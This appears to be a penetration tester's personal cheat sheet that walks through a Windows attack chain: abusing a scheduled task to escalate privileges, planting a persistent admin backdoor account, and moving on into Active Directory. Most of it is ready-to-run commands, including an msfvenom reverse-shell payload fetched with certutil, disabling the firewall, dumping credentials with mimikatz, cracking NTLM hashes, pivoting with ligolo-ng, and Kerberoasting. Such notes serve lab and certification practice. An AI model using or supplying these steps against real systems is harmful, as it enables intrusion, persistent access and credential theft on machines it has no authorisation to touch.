######## Abusing of Scheduled Task to escalate privilges and Persistence via Backdooring ########
Credits: Derron C Attack Path2: https://www.youtube.com/watch?v=jBfdlLybMek

Once we have a first access on a machine, we can run winpeas or enumerate manually to list all the process, task, file that we can use to escalade

    Then if we find a vulnerability on Schedule Task:
        Windows cmd that list TaskName + Privileges:
        -> schtask /query /fo /LIST /v /TN "TaskName"

        We can create a reverse shell to abusing the schedule task and obtain privileges:
            in Kali:
                msfvenom -p windows/x64/shell_reverse_tecp LHOST=<Kali ip> LPORT=<Port> -f exe -o payloadName.exe

                Run a Local Web Server:
                    python -m http.server 8080 or python -m http.server -d . 80 (if we are in Directory)

        Windows:
            certutil.exe -urlcache -f http:///Kali IP/payload.exe payload.exe

            encapsulate the payload into the task exe

            Once we have acces to a renote shell with Admin priv:
                search for local an proof.txt:
                    -> dir /s/b local.txt
                        or
                        dir /s/b *.txt
    
    Backdooring with admin priv:
        C:\Users>net user /add backdoor Password1     <--Create and add a User named Backdoor
                >net localgroup administrators /add backdoor 
                >net localgroup administrators        <- List our backdoor in Admin localgroup
                >net user backdoor                    <- verify again
        
        If not enable use this command to backdooring via RDP and Not - Deny by Denying Terminal Service to '0' :)
            C:\Users> reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /f

        Disable the Win FW: 
            C:\Users> netsh advfirewall set allprofiles state off

        Kali RDP to Get Creds (Enumeration):
            xfreerdp /v:ms01 /u:backdoor /p:Password1 +clipboard /cert:ignore (Local Admin priv)
            Download mimkatz on Git
            python -m http.server or python -m http.server -d . 80 (if we are in Directory)

            Windows: Import Mimikatz downloaded from Kali - Admin CMD in Windows:
                    certutil.exe -f -urlcache http:\\IP/mimikaz.exe minou.exe

                    minou.exe
                    mimikatz# privilege::debug <- should display "20 OK"
                            log <- send the result into file 
                            lsadump::lsa  /inject <- Dump Users

                            sekurlsa::logonpasswords

                            type mimikatz.log | findstr /i username <- Like Grep to parse log file 
                        We can collet the user that we Want and his SID + NTLM Hash 

                The NTLM Hash will help us to Enumerate Active Directory:
                    in Kali:
                        hashcat NTLMHash.hash /usr/share/wordlists/rockyou.txt -m 1000 <- NTLM mode == 1000
                
                With the clear Password from the DeHash off NTLM + User name we can now start the Kerberosting techniques and spray the password.
                --------------------------
                ****But first we need to Pivot because we are not able to attain the KDC server in order to obtain (TGT) through this machine****
    
    Ligolo-NG:
                We will use : https://github.com/nicocha30/ligolo-ng and use the Proxy Tunneling
                                Help doc: https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740

                    7z x ligolo-ng_agent...... <- Unzipp via 7zip
                    rm LICENSE README.md

                    tar -xzvf ligolo-ng_proxy...
                    mv proxy /usr/bin/
                
                        we will use impacket to create an SMB server we will catch the HASH:
                            impacket-smbserver =smb2support stage .

                In compromise Windows via RDP to find the SMB Server generated by Kali-impacket go to check the screenshoot and change the IP in:
                    img/SMB_Server_Windowds.png

                    copy the "agent" and past it in C:\Users\Public:
                        img/agent_Copy_past.png

                In Kali we will run a Proxy:
                    We will create ligolo tunnel interface with our kali account:
                        -> sudo ip tuntap add user kali mode tun ligolo
                            sudo ip link set ligolo up
                            proxy -selfcert <-- Give us the Listenning Port

                In Windows:
                    C:\Users\Public> agent.exe -connect <VPN IP of our Kali:Port> -retry -ignore-cert

                In Kali:
                    ligolo-ng >> session
                                1
                                ifconfig 
                                start
                    we need to add the route displayed in logolo-if config:
                        sudo ip route add DC-Subnet\Mask dev ligolo <-- we will choose the Tunneling interface and add to route in Kali
                        route <- to check if the route to proxy is now added

    Kerberosting:
                If we have connectivity to the DC:
                    impacket-GetUserSPNs -request -dc-ip <DC IP> <domain.name>/<user>
                    Enter the Password found before
                If we get the message "No entries found!" == No Kerberosting possible :( ...
                    

